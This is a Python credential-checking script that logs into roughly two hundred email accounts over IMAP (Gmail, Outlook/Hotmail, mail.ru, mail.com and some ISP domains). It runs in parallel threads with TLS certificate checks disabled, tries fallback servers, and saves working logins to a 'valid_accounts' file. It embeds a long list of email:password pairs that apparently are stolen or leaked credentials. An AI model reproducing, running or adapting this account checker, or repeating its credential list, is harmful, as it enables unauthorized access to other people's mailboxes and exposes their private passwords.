"""Batch-validate email logins across providers via IMAP.

Providers: gmail (993), hotmail/outlook (993), mail.ru (993), mail.com (993),
verizon.net/cox.net/comcast.net/windstream.net/usa.com/email.com (via imap.mail.com)
"""
import imaplib
import ssl
import sys
import io
import os
from concurrent.futures import ThreadPoolExecutor

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

PROVIDERS = {
    "gmail.com":     ("imap.gmail.com", 993),
    "hotmail.com":   ("outlook.office365.com", 993),
    "outlook.com":   ("outlook.office365.com", 993),
    "live.com":      ("outlook.office365.com", 993),
    "mail.ru":       ("imap.mail.ru", 993),
    "mail.com":      ("imap.mail.com", 993),
    "usa.com":       ("imap.mail.com", 993),
    "email.com":     ("imap.mail.com", 993),
    "verizon.net":   ("pop.mail.yahoo.com", 993),     # non-standard, fallback below
    "comcast.net":   ("imap.mail.com", 993),           # fallback
    "cox.net":       ("imap.mail.com", 993),           # fallback
    "windstream.net": ("imap.mail.com", 993),
}

FALLBACK_HOSTS = ["imap.gmail.com", "imap.mail.com", "imap.mail.ru", "outlook.office365.com"]


def imap_host_for(email: str) -> str:
    dom = email.rsplit("@", 1)[-1].lower()
    if dom in PROVIDERS:
        return PROVIDERS[dom][0]
    return "imap.mail.com"


def check(entry):
    email, pwd = entry
    try:
        host = imap_host_for(email)
        client = None
        try:
            client = imaplib.IMAP4_SSL(host, 993, ssl_context=SSL_CTX)
            try:
                client.login(email, pwd)
                code, _ = client.select("INBOX", readonly=True)
                return (email, pwd, "OK" if code == "OK" else "OK(noinbox)", "")
            except imaplib.IMAP4.error as e:
                msg = str(e).strip()
                if "AUTHENTICATIONFAILED" in msg.upper() or "LOGIN FAILED" in msg.upper():
                    return (email, pwd, "FAIL", "wrong creds")
                if "LOCKED" in msg.upper():
                    return (email, pwd, "LOCK", msg[:60])
                return (email, pwd, "FAIL", msg[:60])
            except Exception as e:
                return (email, pwd, "ERR", f"{type(e).__name__}"[:60])
            finally:
                try:
                    client.logout()
                except Exception:
                    pass
        except Exception as e:
            # try fallbacks once
            for fb in FALLBACK_HOSTS:
                if fb == host:
                    continue
                try:
                    client = imaplib.IMAP4_SSL(fb, 993, ssl_context=SSL_CTX)
                    client.login(email, pwd)
                    code, _ = client.select("INBOX", readonly=True)
                    return (email, pwd, "OK-FB" if code == "OK" else "OK(noinbox)", fb)
                except Exception:
                    continue
            return (email, pwd, "CONN", f"{type(e).__name__}"[:60])
    except Exception as e:
        return (email, pwd, "ERR", f"{type(e).__name__}"[:60])


CREDS_RAW = """
sg7548110@gmail.com: qreiamdmxkpbjhrv
dlatt7055@gmail.com: tpzdnxleodawuqwf
dlyabravla655@gmail.com: kprnihvrbgiavdys
shiltsaleisha552@hotmail.com: 560ucutelr
pauline.kramer554@hotmail.com: 6ex2tEnT
strkelle637@hotmail.com: oysuet795
stephane.eberle86@hotmail.com: 463yilerr463
soldo.f@hotmail.com: zL53qzwlf4
yarmanrachael@hotmail.com: YQ3pTGb79vA
taunya.kotz@hotmail.com: Kotz49Kotz
resch.easter@hotmail.com: Resch848
roundxanthia82@hotmail.com: 2oFLeRzGNn
w.kean97@hotmail.com: 3BzD8fQBpC
onleyyahaira84@hotmail.com: stAg29GEr
vargaso.daniele@hotmail.com: S64lipPeR
andre.dottl@hotmail.com: 182ttirbo
richn.izola00@hotmail.com: ytlnobe326
willb_inaya_154@hotmail.com: 1982Inaya1982
chaddock_brunilda.1981@hotmail.com: RNDILEBE366
yergines1999@hotmail.com: SM712lbfx
rouge.cathy.88@hotmail.com: Cathy19881988
tarter.tasia@hotmail.com: UNNYDU594
regena.mclin96@hotmail.com: mclin831831
wynell_mcclean.86@hotmail.com: 8tybQNZWe
shahid_winnifred@hotmail.com: clitlonb730
vinas.josette44@hotmail.com: 9VwvalwqDj8
wat.juliet559@hotmail.com: 6ad6VERB
todd.nieves86@hotmail.com: ToddTodd37
rosena.laulu@hotmail.com: sq24uARe
zanagilmour@hotmail.com: 3MediocRe
shub_lala.1983@hotmail.com: imPen6D8iNg
yesenia.shingleton@hotmail.com: Yesenia19821982
orner.candy@hotmail.com: 363OlySleNI363
yaelpaton65@hotmail.com: PFelbfVC62
elnalibe@hotmail.com: cgD2K2tPn
mendizabal_lela@hotmail.com: 688etoOIOI688
ytuart.farida67@hotmail.com: 2dE8mand
pras.cory@hotmail.com: 715dylususr
bastida.harlie@hotmail.com: cenyRQphT9C
woolums.sharlene106@hotmail.com: 296woolums
xanthippe.fi@hotmail.com: 402fiecke402
quashitanika_90@hotmail.com: 597erenCL597
oriana.roser_70@hotmail.com: LlNw0qRgI
rough.carey1986@hotmail.com: oLEm6Y6w1
antionette_nitka98@hotmail.com: 1998NITKA
zoilaoakland89@hotmail.com: Zoila1989
spall.betty1986@hotmail.com: c1A8NcEr
mirabito.c@hotmail.com: gL88iTtER
petruzzelli.johnny@hotmail.com: Johnny867
luellearmida.1992@hotmail.com: Ti1He072
thresa.fa@hotmail.com: f1eTBa6L
maggie.heenan68@hotmail.com: oyitlb204
winafredwedding_2001@hotmail.com: undeR91wEAr
polizzi.catharine_83@hotmail.com: 2allO3cate
roberto_paniagua96@hotmail.com: 98TORUCEL98
ve.futch_70@hotmail.com: 1cRuS5ade
vandorp_margarette76@hotmail.com: 1976Vandorp1976
wecelina88@hotmail.com: 98weinWEIN
raelynevener.68@hotmail.com: 1surve9illanCe
rosel.aur@hotmail.com: e8Xt2reME
micki.enf@hotmail.com: 735tluldcl735
revell.albert81@hotmail.com: s1pecIAl
wright.van@hotmail.com: 0sQ0by7varW
lashay.shackelton@hotmail.com: 225Lashay225
zainakimes.72@hotmail.com: 1972KIMES
thedacosse@hotmail.com: da8ta3Base
tabitha.kopf66@hotmail.com: iuE0m7vP
retaslaymaker65@hotmail.com: An6xexdr
pennick.lasandra1990@hotmail.com: nbstey298
trefethen_etta@hotmail.com: R3yOWdl3j
eugenie.mckinzy@hotmail.com: 6mAYpfoiW
onida_rook66@hotmail.com: 12rookROOK
steven.tahlia965@hotmail.com: 1978TAHLIA1978
shirleengualtier@hotmail.com: 573sybies
shortt.al@hotmail.com: 70AlvaAlva
genoveva.flinck@hotmail.com: YDHKBzd4Cu4
scheid.babara.92@hotmail.com: 575RLTBBI575
katinato@hotmail.com: tibnnib658
jostenger@hotmail.com: 1992JOANIE
torie.raymo82@hotmail.com: X2bIO5mwD9P
sheridan.currens71@hotmail.com: 557ULCUTUT
faith.cabrales@hotmail.com: noTo5ri1OUS
schabbelva92@hotmail.com: 38veRifY
vanderburhortencia@hotmail.com: 1658Hortencia
rwillford.95@hotmail.com: RENDA1995
ivory.sinat@hotmail.com: 606cCrcYNT606
nichillary76@hotmail.com: qu0es1tIon
rig_hildegard.1982@hotmail.com: aY2X6pYe
kawam.milly1980@hotmail.com: 408cUlUUR408
wi_biby@hotmail.com: bibyBIBY71
audra.byram_66@hotmail.com: 616tnceltub616
queta.genna@hotmail.com: ac66cuSE
tony_gund@hotmail.com: 923olsuti
rmelonie.97@hotmail.com: 1520melonie
pfaukristian894@hotmail.com: fe1rOcious
sigweedon94@hotmail.com: JsPxidT4u
tutwi.myong@hotmail.com: 733DOUBIRIN733
pulanco.jesus@hotmail.com: fzzbgYVBN3n
nikl.yael@hotmail.com: nIKS467nik
adali.lory@hotmail.com: lory2005
quincyaryee@hotmail.com: qUinCY1991
tothyrush@hotmail.com: eH9RHjaD
kearney.l@hotmail.com: Kearney250
nlott.britney@hotmail.com: 2317BbBrItney
sunderland.gigi.92@hotmail.com: 9272sUnderland
vickymlott456@hotmail.com: VickyLott1456
sherley.olga@hotmail.com: olga2002
charlotte2850@hotmail.com: kelalu2850
avyavya.vyaavy@mail.ru: zmARvx1MRvXppZV6xkXj
gdfds98@mail.ru: 1CtFuHTaQxNda8X06CaQ
dfsdfdsfdf51@mail.ru: SXxrCndCR59s5G9sGc6L
aria.therese.svensson@mail.com: Zorro1ab
taterbug@verizon.net: Holly1!
ejbrickner@comcast.net: Pass1178
teressapeart@cox.net: Quinton2329!
liznees@verizon.net: Dancer008
olajakubovich@mail.com: OlaKub2106OlaKub2106
kcdg@charter.net: Jennifer3*
bean_118@hotmail.com: Liverpool118!
dsdhjas@mail.com: LONGHACH123
robitwins@comcast.net: May241996
sdgdfg56@mail.com: kenwood4201
garrett.danelz@comcast.net: N11golfer!
gillian_1211@hotmail.com: Gilloveu1211
sunpit16@hotmail.com: Putter34!
fdshelor@verizon.net: Masco123*
yeags1@cox.net: Zoomom1965!
amine002@usa.com: iScrRoXAei123
bbarcelo16@cox.net: Bsb161089$$
laliebert@hotmail.com: pirates2
vallen285@comcast.net: Delft285!1!
sierra12@email.com: tegen1111
luanne.zapevalova@mail.com: FqWtJdZ5iN@
kmay@windstream.net: Nascar98
redbrick1@mail.com: Redbrick11
ivv9ah7f@mail.com: K226nw8duwg
erkobir@live.com: floydLAWTON019
Misscarter@mail.com: ashtray19
carlieruby10@cox.net: Lollypop789$
blackops2013@mail.com: amason123566
caroline_cullum@comcast.net: carter14
raumonatuhadi@mail.ru: a7r6U9J6KHDaguAsidDH
floworadpewoodvi@mail.ru: ZcyUg5MUq8jMr9i8aST1
letzegebquirdisnui@mail.ru: abniAcbrCjRskpysMc75
millveramontmoni@mail.ru: bLd8Zg4tqfxmUq7KW5jW
letkixipromnussi@mail.ru: bNraxddiagE9Sx23SxYt
hotriosmartraverba@mail.ru: cALqh0bjnPefyiu7WL0v
pillgemisscritcomsa@mail.ru: dHBUrMg6aqXhvx0m1cVf
leigedeamvebig@mail.ru: dVTsGqDbZYbjse9iHNR2
knocrufridunringgent@mail.ru: dn333DbbuEfGnqw08Rxm
tworensodiapansaa@mail.ru: dsGajJE1TtiAGgZsgyvQ
korlithiobtennick@mail.ru: feDLSiueGT89APb81v74
terbgebuoviror@mail.ru: gaqaKs06xg22kkXXW2LU
tioreibunthandvahear@mail.ru: ggKygTjxSLzwm4tWd43B
lovedel.anisss@mail.ru: cJkiz18MAWS0L85DGW8n
love.efs@mail.ru: vzw5bwePbzeXhYhDeeA1
fsadfsaf.sdfasdfas@mail.ru: KUN0wpJbViwpFXFPkHb4
fkjvfmdsof@mail.ru: CxM2JUT0vx03aSyD53Ns
sawage.dasha@mail.ru: SyfStmkgK29KUB0BQVAy
opunm.sdaww@mail.ru: Y1BjSZCHeLTxmvaW49FH
fall.gall@mail.ru: tFqTgMUqkidcBbw91hD7
wzxcvd@mail.ru: vwPUnRUGW75MUKaFzhVc
masha.mashala@mail.ru: rtM0rCSHZstDVQpxmEkh
wwagege@mail.ru: ZZNkRLrZseLN57phVeEQ
irigjfodjdkdkk@mail.ru: n8r0TKCygC5xqaWxStr1
sdfghafdhg@mail.ru: Kag0fefn6mFWMzQ17PGb
dasha.goat@mail.ru: 3bkf9iHyuFUfEfKzXYLm
dasha.sasaas@mail.ru: UAVwCgpFXaD2zcQ9gVSE
dasha.lovely.02@mail.ru: paUrCHANKWWxefzaQvQm
dasha.butifull@mail.ru: 0bAbKQUfpVRDcrLtc0Ya
firirotifigj@gmail.com: RQCgW8vb127AGRZ5Kvf1
dasha.mdaaa@gmail.com: HXNg0M0bvyaEs1tbMjTB
lfwgdg@mail.ru: h6hAUvp3KNPqqcmmduU3
dasha.holle@mail.ru: 0g5g6kwEtkKw2hYCaSTj
darya.holly@mail.ru: he02duEXu4iiDambB6ZG
dasha.vonk@mail.ru: AayKrKyfEDyeubmRqKRm
kloxc@mail.ru: FVUeii2MdbNcqEmZrq7N
proto.dasha@mail.ru: LqJt4xXtqaAxUsd4D1HD
dportq@mail.ru: CRUJZ7gi37VFn6a9mmYx
dasha.port.06@mail.ru: Cnsy43cXqbAGVUswWdig
portuyeye@mail.ru: y2jPgBkCxLuDBiHU2cAV
dlegoyy@mail.ru: NtX9FmVJDi8fsBusv16Z
portee05@mail.ru: 2eiDAier2n1MBrf1MZiX
flipov.vlad@mail.ru: yePH6i1Sxw7XiYjR3E5K
msolhov@mail.ru: RzQcdrRwYaJqycuxHzxM
aslocv@mail.ru: i7n8zk8Dy0E9v7Sx2wLX
kagbxz@mail.ru: vYkY8mrbqxGzpz8NqXe7
mardjela@mail.ru: Cug2mXZ5d4c8aLNfnwCR
egsdfdg@mail.ru: kCYudJg4P1KYF7iLkgcK
ejofree@mail.ru: YKxiqwNwA87DEf8VftHF
lina.fdfsfg@mail.ru: ts4JsHZhPf2vZ8rqxhmr
abfdgs@mail.ru: vqdEDLtXpTU784KqLcvF
pgkksdg@mail.ru: qfs6Nrg2zG2Zfudt8idz
vadgadg@mail.ru: VkM3a1GpPaABr84PCztb
jake.nod@mail.ru: 39uS26JTgKrBWJFdC16h
noah.soli@mail.ru: xXvHn9usximafHmt4Rup
jdlodd@mail.ru: rcAxee0FtnzL0wf4qUuX
mmardjela@mail.ru: 3fhUwHBWipHasch29fv0
andrea.aalto@mail.ru: XJrFhNwPamYaz6mjJ6yT
luca.velde@mail.ru: cEeCv1mtP8Y2fsL4F1Xf
esolhov@mail.ru: HB3zF1mz1H7EDEfinhdi
fdfsfg04@mail.ru: hSrWxzjRWBLDYuPAB60F
amardjela@mail.ru: rmyndAbyj7e5gjg3queN
mrashni@mail.ru: Gukjw4sbwCrgAgFaZzx1
"""


def main():
    creds = []
    for line in CREDS_RAW.strip().splitlines():
        line = line.strip()
        if ":" not in line:
            continue
        em, pw = line.rsplit(":", 1)
        em = em.strip()
        pw = pw.strip()
        if em and pw:
            creds.append((em, pw))
    # dedup
    seen = {}
    for em, pw in creds:
        seen[em] = pw
    uniq = list(seen.items())

    sys.stdout.reconfigure(encoding="utf-8")
    print(f"checking {len(uniq)} unique accounts...")

    results = []
    with ThreadPoolExecutor(max_workers=12) as ex:
        for row in ex.map(check, uniq):
            results.append(row)
            mark = {"OK": "+", "OK-FB": "FB", "FAIL": "-", "LOCK": "L", "ERR": "!", "CONN": "c"}.get(row[2], "?")
            print(f"  [{mark}] {row[0]:<44} {row[2]:<9} {row[3]}")

    ok = [r for r in results if r[2].startswith("OK")]
    fail = [r for r in results if not r[2].startswith("OK")]

    with io.open("valid_accounts.txt", "a", encoding="utf-8") as f:
        for email, pw, _, _ in ok:
            f.write(f"{email}|{pw}\n")
    with io.open("fail_accounts.txt", "a", encoding="utf-8") as f:
        for email, pw, s, reason in fail:
            f.write(f"{email}|{pw}|{s}|{reason}\n")

    print(f"\nvalid: {len(ok)}   fail: {len(fail)}   total: {len(uniq)}")


if __name__ == "__main__":
    main()
